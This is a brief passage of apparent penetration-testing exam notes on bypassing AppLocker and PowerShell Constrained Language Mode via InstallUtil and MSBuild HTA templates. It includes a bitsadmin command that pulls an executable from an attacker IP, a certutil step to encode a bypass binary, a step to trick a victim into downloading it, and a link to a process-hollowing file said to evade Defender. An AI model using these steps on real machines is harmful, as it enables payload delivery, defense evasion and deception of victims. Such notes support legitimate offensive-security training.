### <ins>InstallUtil (installutil.hta)</ins>
*Note: if curl is not available on the target machine, we can use bitsadmin instead:*
- `bitsadmin /transfer myJob http://192.168.45.199/scanVenger.exe C:\Windows\Tasks\scanvenger.exe`

- Compile C# executable that uses Custom Powershell Runspace.
- Convert the outputted EXE to txt using certutil: `certutil -encode clm-bypass.exe file.txt`
- Use the InstallUtil template to trick the victim to download the file.txt file and let the magic happen.

### <ins>MSBuild (msbuild.hta)</ins>
- Use the file [hollow.xml](https://github.com/Extravenger/OSEPlayground/blob/main/03%20-%20CLM%20%26%20Applocker%20Bypass/3%20-%20MSBuild/hollow.xml). (Bypass defender and Applocker default rules)
